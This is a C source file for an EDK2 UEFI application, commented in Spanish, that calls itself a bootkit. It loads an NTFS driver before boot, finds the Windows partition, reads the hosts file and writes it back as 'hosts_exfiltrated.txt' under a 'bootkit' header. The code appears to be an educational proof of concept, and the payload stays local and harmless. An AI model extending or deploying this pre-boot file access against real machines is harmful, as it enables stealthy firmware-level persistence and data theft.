//  _____                                       _____
// ( ___ )                                     ( ___ )
//  |   |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|   |
//  |   |  __  __         _               ____  |   |
//  |   | |  \/  |  __ _ (_) _ __        / ___| |   |
//  |   | | |\/| | / _` || || '_ \      | |     |   |
//  |   | | |  | || (_| || || | | |  _  | |___  |   |
//  |   | |_|  |_| \__,_||_||_| |_| (_)  \____| |   |
//  |___|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|___|
// (_____)                                     (_____)

// ============================================================================
// INCLUDES
// ============================================================================

// ************************************
//     EDK2 Libraries
// ************************************

// Fichero de inclusión raíz para cualquier módulo UEFI. Define todos los tipos de datos,
// constantes y estructuras estándar del entorno UEFI, permitiendo la portabilidad.
// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Uefi.h
#include <Uefi.h>

// Contiene funciones de alto nivel que simplifican operaciones comunes en UEFI,
// como la gestión de protocolos y la impresión en la consola (Print).
// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiLib.h
#include <Library/UefiLib.h>

// Define el punto de entrada estándar para aplicaciones UEFI (`UefiMain`) y gestiona
// la inicialización necesaria para que la aplicación se ejecute correctamente.
// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiApplicationEntryPoint.h
#include <Library/UefiApplicationEntryPoint.h>

// Ofrece funciones básicas para manipular el contenido de bloques de memoria ya existentes,
// como CopyMem (copiar), SetMem (rellenar) o CompareMem (comparar).
// Es una librería fundamental de bajo nivel, utilizable en todas las fases del arranque.
// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/BaseMemoryLib.h
#include <Library/BaseMemoryLib.h>

// ************************************
//     Local Files
// ************************************

#include <Utils/UtilsFiles.h>



// ============================================================================
// FUNCTIONS
// ============================================================================

/**
 * @brief Lee el fichero hosts de Windows y lo guarda con una cabecera.
 *
 * @details
 * Esta función orquesta el proceso de exfiltración:
 * 1. Llama a `UtilsFiles_FindWindowsPartition` para localizar el volumen de Windows.
 * 2. Llama a `UtilsFiles_ReadFile` para leer el contenido de `\Windows\System32\drivers\etc\hosts`.
 * 3. Crea un nuevo buffer en memoria.
 * 4. Combina una cabecera de "bootkit" con el contenido del fichero hosts en el nuevo buffer.
 * 5. Llama a `UtilsFiles_WriteFile` para guardar este buffer combinado en un nuevo
 * fichero llamado `\hosts_exfiltrated.txt` en la misma partición de Windows.
 * 6. Libera toda la memoria y recursos utilizados.
 */
EFI_STATUS
ExfiltrateHostsFile(
	VOID
)
{
	//
	// --- SECCIÓN 1: PREPARACIÓN ---
	//

	EFI_STATUS Status;
	EFI_HANDLE WindowsVolumeHandle = NULL;
	VOID *HostsBuffer = NULL;
	UINTN HostsBufferSize = 0;
	VOID *ExfilBuffer = NULL;
	UINTN ExfilBufferSize = 0;

	//
	// --- SECCIÓN 2: ENCONTRAR LA PARTICIÓN DE WINDOWS ---
	//

	Print(L"[ INFO ]-{ main.c }-( ExfiltrateHostsFile )-> Buscando la pariticion de Windows");

	Status = UtilsFiles_FindWindowsPartition(&WindowsVolumeHandle);

	if (EFI_ERROR(Status))
	{
		Print(L"[ ERROR ]-{ main.c }-( ExfiltrateHostsFile )-> No se pudo encontrar la particion de Windows\n");
		return Status;
	}

	//
	// --- SECCIÓN 3: LEER EL FICHERO HOSTS ---
	//

	Print(L"[ INFO ]-{ main.c }-( ExfiltrateHostsFile )-> Leyendo fichero \\Windows\\System32\\drivers\\etc\\hosts\n");

	Status = UtilsFiles_ReadFile(
		WindowsVolumeHandle,
		L"\\Windows\\System32\\drivers\\etc\\hosts",
		&HostsBuffer,
		&HostsBufferSize
	);

	if (EFI_ERROR(Status))
	{
		Print(L"[ ERROR ]{ main.c }-( ExfiltrateHostsFile )-> No se pudo leer el fichero hosts: %r\n", Status);
		return Status;
	}

	Print(L"[ SUCCESS ]-{ main.c }-( ExfiltrateHostsFile )-> Fichero hosts leido (%d bytes)\n", HostsBufferSize);

	//
	// --- SECCIÓN 4: PREPARAR EL NUEVO FICHERO ---
	//

	CHAR8 Header[] = "### FICHERO EXFILTRADO POR BOOTKIT ###\n\n";

	ExfilBufferSize = sizeof(Header) - 1 + HostsBufferSize; // -1 para no contar el nulo del header

	ExfilBuffer = AllocatePool(ExfilBufferSize);

	if (ExfilBuffer == NULL)
	{
		Print(L"[ ERROR ]-{ main.c }-( ExfiltrateHostsFile )-> No se pudo reservar memoria para el nuevo fichero\n");
		FreePool(HostsBuffer); // Liberamos el buffer que sí se reservó.
		
		return EFI_OUT_OF_RESOURCES;
	}

	// Combinamos el header y el contenido del hosts en el nuevo buffer.
	CopyMem(
		ExfilBuffer,
		Header,
		sizeof(Header) - 1
	);
	CopyMem(
		(CHAR8 *)ExfilBuffer + sizeof(Header) - 1,
		HostsBuffer,
		HostsBufferSize
	);

	//
	// --- SECCIÓN 5: ESCRIBIR EL NUEVO FICHERO ---
	//
	
	Print(L"[ INFO ]-{ main.c }-( ExfiltrateHostsFile )-> Escribiendo fichero: \\hosts_exfiltrated.txt\n");
	
	Status = UtilsFiles_WriteFile(
		WindowsVolumeHandle,
		L"\\hosts_exfiltrated.txt",
		ExfilBuffer,
		ExfilBufferSize
	);

	if (EFI_ERROR(Status))
	{
		Print(L"[ ERROR ]-{ main.c }-( ExfiltrateHostsFile )-> No se pudo escribir el fichero de salida: %r\n", Status);
	}
	else
	{
		Print(L"[ SUCCESS ]-{ main.c }-( ExfiltrateHostsFile )-> Fichero exfiltrado guardado correctamente\n");
	}

	//
	// --- SECCIÓN 6: LIMPIEZA ---
	//

	FreePool(HostsBuffer);
	FreePool(ExfilBuffer);

	return Status;
}

EFI_STATUS
EFIAPI
UefiMain(
	IN EFI_HANDLE ImageHandle,
	IN EFI_SYSTEM_TABLE *SystemTable
)
{
	EFI_STATUS Status;

	Print(L"\n\n=====================================================\n");
	Print(L"\tCARGANDO DRIVER NTFS\n");
	Print(L"=====================================================\n\n");
	
	EFI_HANDLE NtfsDriverHandle = NULL;

	Status = UtilsFiles_InitializeNtfsDriver(&NtfsDriverHandle);
	if (EFI_ERROR(Status))
	{
		Print(L"[ ERROR ]-{ main.c }-( UefiMain )-> La inicializacion del driver NTFS ha fallado\n");
		goto Exit;
	}
	Print(L"[ SUCCESS ]-{ main.c }-( UefiMain )-> El driver NTFS ha sido cargado y activado\n");

	Print(L"\n\n=====================================================\n");
	Print(L"\tEXFILTRANDO DATOS\n");
	Print(L"=====================================================\n\n");

	ExfiltrateHostsFile();


	Exit:
		Print(L"[ INFO ]-{ main.c }-( UefiMain )-> La aplicacion ha finalizado\n");
		return Status;
}